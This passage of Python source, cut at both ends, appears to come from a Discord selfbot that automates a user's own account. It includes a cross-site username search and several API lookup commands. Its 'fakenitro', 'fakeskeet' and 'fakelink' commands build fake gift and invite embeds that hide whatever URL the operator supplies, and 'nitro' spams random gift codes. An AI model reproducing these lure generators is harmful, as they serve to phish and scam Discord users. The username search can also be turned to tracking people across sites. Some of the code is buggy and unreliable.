                    # if error is present we will set flag to False
                    if errors in r.text:
                        error_flag = False
                else:
                    # If it's list, it will iterate all the error message
                    for error in errors:
                        if error in r.text:
                            error_flag = False
                            break
                if error_flag:
                    result = QueryResult(username,
                                        social_network,
                                        url,
                                        QueryStatus.CLAIMED,
                                        query_time=response_time)
                else:
                    result = QueryResult(username,
                                        social_network,
                                        url,
                                        QueryStatus.AVAILABLE,
                                        query_time=response_time)
            elif error_type == "status_code":
                # Checks if the status code of the response is 2XX
                if not r.status_code >= 300 or r.status_code < 200:
                    result = QueryResult(username,
                                        social_network,
                                        url,
                                        QueryStatus.CLAIMED,
                                        query_time=response_time)
                else:
                    result = QueryResult(username,
                                        social_network,
                                        url,
                                        QueryStatus.AVAILABLE,
                                        query_time=response_time)
            elif error_type == "response_url":
                # For this detection method, we have turned off the redirect.
                # So, there is no need to check the response URL: it will always
                # match the request.  Instead, we will ensure that the response
                # code indicates that the request was successful (i.e. no 404, or
                # forward to some odd redirect).
                if 200 <= r.status_code < 300:
                    result = QueryResult(username,
                                        social_network,
                                        url,
                                        QueryStatus.CLAIMED,
                                        query_time=response_time)
                else:
                    result = QueryResult(username,
                                        social_network,
                                        url,
                                        QueryStatus.AVAILABLE,
                                        query_time=response_time)
            else:
                # It should be impossible to ever get here...
                raise ValueError(f"Unknown Error Type '{error_type}' for "
                                f"site '{social_network}'")


            # Notify caller about results of query.
            query_notify.update(result)

            # Save status of request
            results_site['status'] = result

            # Save results from request
            results_site['http_status'] = http_status
            results_site['response_text'] = response_text

            # Add this site's results into final dictionary with all of the other results.
            results_total[social_network] = results_site

        # Notify caller that all queries are finished.
        query_notify.finish()

        return results_total


    def timeout_check(value):
        from argparse import ArgumentTypeError

        try:
            timeout = float(value)
        except:
            raise ArgumentTypeError(f"Timeout '{value}' must be a number.")
        if timeout <= 0:
            raise ArgumentTypeError(f"Timeout '{value}' must be greater than 0.0s.")
        return timeout

    @React.command(usage="sherlocksearch <Username>", description="Searches for social media accounts")
    async def sherlocksearch(ctx, *, username):
        try:                          
            if not os.path.exists('./sherlockdata.json'):
                open('./sherlockdata.json', 'wb').write(requests.get("https://raw.githubusercontent.com/sherlock-project/sherlock/master/sherlock/resources/data.json", allow_redirects=True).content)

            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Sherlock', description=f'Please wait, the search could take a while.',timestamp=embed_timestamp())
            embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            searching_embed = await ctx.send(embed=embed)
            
            sites = SitesInformation(os.path.join(os.path.dirname(__file__), "./sherlockdata.json"))
            site_data_all = {}
            for site in sites:
                site_data_all[site.name] = site.information


            site_data = site_data_all

            query_notify = QueryNotifyPrint(result=None,
                                verbose=False,
                                print_all=False,
                                color=False)

            results = sherlock(username,
                                site_data,
                                query_notify,
                                tor=False,
                                unique_tor=False,
                                proxy=False,
                                timeout=5)

            sb_results = []

            for website_name in results:
                dictionary = results[website_name]
                if dictionary.get("status").status == QueryStatus.CLAIMED:
                    sb_results.append(dictionary["url_user"])

            print(fg.purple3)

            await searching_embed.delete()

            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Sherlock', description='\n'.join([f"{result}" for result in sb_results]) or 'None',timestamp=embed_timestamp())
            embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


        except discord.HTTPException:
            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Sherlock', description=f'The result for {username} was too long, the results have been saved in {username}.txt',timestamp=embed_timestamp())
            embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


            with open(f"{username}.txt", "w", encoding="utf-8") as file:
                exists_counter = 0
                for website_name in results:
                    dictionary = results[website_name]
                    if dictionary.get("status").status == QueryStatus.CLAIMED:
                        exists_counter += 1
                        file.write(dictionary["url_user"] + "\n")
                file.write(f"Total Websites Username Detected On : {exists_counter}\n")
        except:
            pass
        
    @React.command(usage="afklog", description="Show who sent you while being AFK")
    async def afklog(ctx):
        try:                                        
            if True:
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'AFK Log', description='\n'.join([f"{g.name}#{g.discriminator}" for g in afk_messaged_people]) or 'None',timestamp=embed_timestamp())
                embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            else:
                await ctx.send(f'`AFK Log:`' + '\n'.join([f"{g.name}#{g.discriminator}" for g in afk_messaged_people]) or 'None')
        except:
            pass
        
    @React.command(usage="mutualfriends <User>", description="Shows mutual friends with user")
    async def mutualfriends(ctx, user: discord.User=None):
        try:
        
            if user is None:
                member = ctx.author
            else:
                member = ctx.guild.get_member(user.id)
            if True:
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Mutual friends with {member}', description='\n'.join([f.name + '#' + f.discriminator for f in await member.mutual_friends()]) or 'None',timestamp=embed_timestamp())
                embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            else:
                await ctx.send(f'`Mutual friends with {member}:`' + '\n'.join([f.name + '#' + f.discriminator for f in await member.mutual_friends()]) or 'None')
        except:
            pass

    @React.command(usage="blocks", description="Shows a list of your blocked users")
    async def blocks(ctx):
        try:
            le_blocks = ctx.bot.user.blocked
            if True:
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Blocked Users', description='\n'.join([b.name + '#' + b.discriminator for b in le_blocks]) or 'None',timestamp=embed_timestamp())
                embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            else:
                await ctx.send(f'`Blocked Users:`' + '\n'.join([f.name + '#' + f.discriminator for f in await member.mutual_friends()]) or 'None')
        except:
            pass

    @React.command(usage="pokedex <Pokemon>", description="Shows Pokedex information about a Pokemon")
    async def pokedex(ctx, pokemon: str):
        
        if pokemon is not None:
            resp = requests.get(f'https://some-random-api.ml/pokedex?pokemon={urllib.parse.quote(pokemon)}')
            j = resp.json()
            
            types = ''
                
            for i, _type in enumerate(j["type"]):
                if i:
                    types += ', '
                types += f'{_type}'
            if True:
                embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Pok√©dex Information about {j["name"].capitalize()}', description=f'{j["description"]}',timestamp=embed_timestamp())
                embed.set_thumbnail(url=f'{j["sprites"]["animated"]}')
                embed.add_field(name=f'Name', value=f'{j["name"].capitalize()}', inline=True)
                embed.add_field(name=f'ID', value=f'{j["id"]}', inline=True)
                embed.add_field(name=f'Species', value=f'{j["species"][0]}', inline=True)
                embed.add_field(name=f'Types', value=f'{types}', inline=True)
                embed.add_field(name=f'Height', value=f'{j["height"]}', inline=True)
                embed.add_field(name=f'Weight', value=f'{j["weight"]}', inline=True)
                embed.add_field(name=f'Generation', value=f'{j["generation"]}', inline=True)
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            else:
                msg = f'''```yaml
Pok√©dex Information
Name: {j["name"].capitalize()}
Description: {j["description"]}
ID: {j["id"]}
Species: {j["species"][0]}
Types: {types}
Height: {j["height"]}
Weight: {j["weight"]}
Generation: {j["generation"]}
```'''
                await ctx.send(msg)
                await ctx.send(j["sprites"]["animated"])
            
    @React.command(usage="weather <City>", description="Shows the current weather in the specified city")
    async def weather(ctx, *, city: str):
        
        if city is not None:
            resp = requests.get(f'https://www.metaweather.com/api/location/search/?query={urllib.parse.quote(city)}')
            j = resp.json()
            woeid = j[0]['woeid']
            info = requests.get(f'https://www.metaweather.com/api/location/{woeid}/')
            data = info.json()
            information = data['consolidated_weather'][0]
            
            if True:
                embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Todays weather in {city}',timestamp=embed_timestamp())
                embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.add_field(name=f'__‚õÖ Weather State__', value=f'{information["weather_state_name"]}', inline=True)
                embed.add_field(name=f'__üå° Min Temperature__', value=f'{round(information["min_temp"])}¬∞C', inline=True)
                embed.add_field(name=f'__üå° Max Temperature__', value=f'{round(information["max_temp"])}¬∞C', inline=True)
                embed.add_field(name=f'__üå° Temperature__', value=f'{round(information["the_temp"])}¬∞C', inline=True)
                embed.add_field(name=f'__üéê Wind Speed__', value=f'{round(information["wind_speed"])} km/h', inline=True)
                embed.add_field(name=f'__üéà Air Pressure__', value=f'{information["air_pressure"]} bar', inline=True)
                embed.add_field(name=f'__üßä Humidity__', value=f'{information["humidity"]}%', inline=True)
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            else:
                msg = f'''```yaml
Todays weather in {city}
City: {city}
Weather State: {information["weather_state_name"]}
Min Temperature: {round(information["min_temp"])}¬∞C
Max Temperature: {round(information["max_temp"])}¬∞C
Temperature: {round(information["the_temp"])}¬∞C
Wind Speed: {round(information["wind_speed"])} km/h
Air Pressure: {information["air_pressure"]} bar
Humidity: {information["humidity"]}%
```'''
                await ctx.send(msg)
        else:
            print(fg.red + 'Missing arguments')
    
    @React.command(usage="discordstatus", description="Shows current Discord Status")
    async def discordstatus(ctx):
        
        resp = requests.get(f'https://srhpyqt94yxb.statuspage.io/api/v2/summary.json')
        data = resp.json()
        information = data['components']
        
        if True:
            embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Current Discord Status',timestamp=embed_timestamp())
            embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.add_field(name=f'Cloudflare', value=information[0]['status'].capitalize(), inline=True)
            embed.add_field(name=f'API', value=information[2]['status'].capitalize(), inline=True)
            embed.add_field(name=f'Tax Calculation', value=information[4]['status'].capitalize(), inline=True)
            embed.add_field(name=f'Media Proxy', value=information[5]['status'].capitalize(), inline=True)
            embed.add_field(name=f'Push Notifications', value=information[8]['status'].capitalize(), inline=True)
            embed.add_field(name=f'Voice', value=information[9]['status'].capitalize(), inline=True)
            embed.add_field(name=f'Third Party', value=information[12]['status'].capitalize(), inline=True)
            embed.add_field(name=f'Overall Status', value=f"{data['status']['description'].capitalize()}", inline=True)
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


        else:
            msg = f'''```yaml
Discord Status:
Cloudflare: {information[0]['status'].capitalize()}
API: {information[2]['status'].capitalize()}
Tax Calculation: {information[4]['status'].capitalize()}
Media Proxy: {information[5]['status'].capitalize()}
Push Notifications: {information[8]['status'].capitalize()}
Voice: {information[9]['status'].capitalize()}
Third Party: {information[12]['status'].capitalize()}
Overall Status: {data['status']['description'].capitalize()}
```'''
            await ctx.send(msg)
            
    @React.command(usage="rockstargamesstatus", description="Shows Rockstar Games Status")
    async def rockstargamesstatus(ctx):
        
        resp = requests.get(f'https://support.rockstargames.com/services/status.json')
        data = resp.json()
        information = data['services']
        
        if True:
            embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Current Rockstar Games Status',timestamp=embed_timestamp())
            embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.add_field(name=f'General', value="üü¢ Online" if information[0]['status'] else "üî¥ Offline", inline=True)
            embed.add_field(name=f'Red Dead Online', value="üü¢ Online" if information[1]['status'] else "üî¥ Offline", inline=True)
            embed.add_field(name=f'Grand Theft Auto Online', value="üü¢ Online" if information[2]['status'] else "üî¥ Offline", inline=True)
            embed.add_field(name=f'Social Club', value="üü¢ Online" if information[3]['status'] else "üî¥ Offline", inline=True)
            embed.add_field(name=f'Support', value="üü¢ Online" if information[4]['status'] else "üî¥ Offline", inline=True)
            embed.add_field(name=f'Rockstar Games Launcher', value="üü¢ Online" if information[5]['status'] else "üî¥ Offline", inline=True)
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


        else:
            msg = f'''```yaml
Rockstar Games Status:
General: {"üü¢ Online" if information[0]['status'] else "üî¥ Offline"}
Red Dead Online: {"üü¢ Online" if information[1]['status'] else "üî¥ Offline"}
Grand Theft Auto Online: {"üü¢ Online" if information[2]['status'] else "üî¥ Offline"}
Social Club: {"üü¢ Online" if information[3]['status'] else "üî¥ Offline"}
Support: {"üü¢ Online" if information[4]['status'] else "üî¥ Offline"}
Voice: {"üü¢ Online" if information[5]['status'] else "üî¥ Offline"}
Rockstar Games Launcher: {"üü¢ Online" if information[6]['status'] else "üî¥ Offline"}
```'''
            await ctx.send(msg)

    @React.command(usage="urbandict <Word>", description="Shows the urban definition of a word")
    async def urbandict(ctx, *, term: str):
        
        if term is not None:
            response = requests.get(f'https://api.urbandictionary.com/v0/define?term={urllib.parse.quote(term)}')
            data = response.json()

            word = data['list'][0]['word']
            link = data['list'][0]['permalink']
            definition = data['list'][0]['definition'].replace('[', '').replace(']', '')
            example = data['list'][0]['example'].replace('[', '').replace(']', '')

            if True:
                embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Urban Dictionary',timestamp=embed_timestamp())
                embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.add_field(name=f'__üßØ Word__', value=f'[{word}]({link})', inline=False)
                embed.add_field(name=f'__üßº Definition__', value=f'{definition}', inline=False)
                embed.add_field(name=f'__üß™ Example__', value=f'{example}', inline=False)
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            else:
                await ctx.send(f'''```yaml
Urban Dictionary:
Word: {word}
Link: {link}
Definition: {definition}
Example: {example}
```''')
        else:
            print(fg.red + 'Missing arguments')
            
    @React.command(usage="define <Word>", description="Shows the definition of a word")
    async def define(ctx, *, term: str):
        
        if term is not None:
            response = requests.get(f'https://api.dictionaryapi.dev/api/v2/entries/en/{urllib.parse.quote(term)}').json()
            data = response[0]
            word = data['word']
            phonetic = data['phonetics'][0]['text']
            part_of_speech = data['meanings'][0]['partOfSpeech']
            definition = data['meanings'][0]['definitions'][0]['definition']
            example = data['meanings'][0]['definitions'][0]['example']

            if True:
                embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Definition of {term}',timestamp=embed_timestamp())
                embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.add_field(name=f'__üßØ Word__', value=f'{word}', inline=False)
                embed.add_field(name=f'__üßº Definition__', value=f'{definition}', inline=False)
                embed.add_field(name=f'__üß™ Example__', value=f'{example}', inline=False)
                embed.add_field(name=f'__üìç Phonetic__', value=f'{phonetic}', inline=True)
                embed.add_field(name=f'__üì¶ Part of Speech__', value=f'{part_of_speech}', inline=True)
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            else:
                await ctx.send(f'''```yaml
Definition of {term}:
Word: {word}
Definition: {definition}
Example: {example}
Phonetic: {phonetic}
Part of Speech: {part_of_speech}
```''')
        else:
            print(fg.red + 'Missing arguments')

    @React.command(usage="fakenitro <Link>", description="Generates fake Nitro URL")
    async def fakenitro(ctx, url: str):
        
        if url is not None:
            letters_and_digits = string.ascii_letters + string.digits
            fake_nitro_url = ''.join((random.choice(letters_and_digits) for i in range(16)))

            embed= discord.Embed(color=0xFF7DE9, title=f'Successfully Generated Nitro', description=
            f'''
            Successfully generated Discord Nitro Code...
            **Code Type:** Classic
            **Gift Link:** [https://discord.gift/{fake_nitro_url}]({url})
            ''', 
            timestamp=embed_timestamp())
            embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text='Discord Administration Tool')
            await ctx.send(embed=embed)
            
    @React.command(usage="fakeskeet <Link>", description="Generates fake Skeet Invite URL")
    async def fakeskeet(ctx, url: str):
        
        if url is not None:
            letters_and_digits = string.ascii_letters + string.digits
            fake_skeet_code = ''.join((random.choice(letters_and_digits) for i in range(32)))

            embed= discord.Embed(color=0x5FC312, title=f'Successfully Generated Skeet Invite', description=
            f'''
            Successfully generated Skeet Invite...
            To redeem click the link.
            **Invite URL:** [https://gamesense.pub/forums/register.php?invite={fake_skeet_code}]({url})
            ''', 
            timestamp=embed_timestamp())
            embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text='GameSense Administration Tool')
            await ctx.send(embed=embed)

    @React.command(usage="fakelink <Fake Link> <Original Link>", description="Sends a fake link")
    async def fakelink(ctx, fake_url: str, url: str):
        
        if url is not None:
            embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], description=
            f'''
            [{fake_url}]({url})
            ''')
            await ctx.send(embed=embed)

    @React.command(usage="nitro <Amount>", description="Generates Nitro and sends Codes every 3 seconds")
    async def nitro(ctx, amount: int):
        
        if amount is not None:
            for j in range(amount):
                letters_and_digits = string.ascii_letters + string.digits
                nitro_code = ''.join((random.choice(letters_and_digits) for i in range(16)))
                await ctx.send(f'https://discord.gift/{nitro_code}')
                await asyncio.sleep(3)
                
    @React.command(usage="randomguildemoji", description="Sends a random emoji from the guild (only guilds)")
    async def randomguildemoji(ctx):
        response = requests.get(f'https://ranmoji.herokuapp.com/emojis/api/v.1.0/').json()
        emoji = response['emoji']
        await ctx.send(random.choice(ctx.guild.emojis))

    @React.command(usage="gping <@User>", description="Ghostpings an user")
    async def gping(ctx):
        return
    
    @React.command(usage="uptime", description="Shows the selfbot uptime")
    async def uptime(ctx):
        try:
            def timedelta_since_epoch(timestamp: int):
                days = round(timestamp / 86400)
                return days
            elapsed = int(time.time() - uptime_start)
            total_uptime = time.strftime(f'{timedelta_since_epoch(elapsed)} days, %H:%M:%S', time.gmtime(elapsed))
            if True:
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Selfbot Uptime',timestamp=embed_timestamp())
                embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
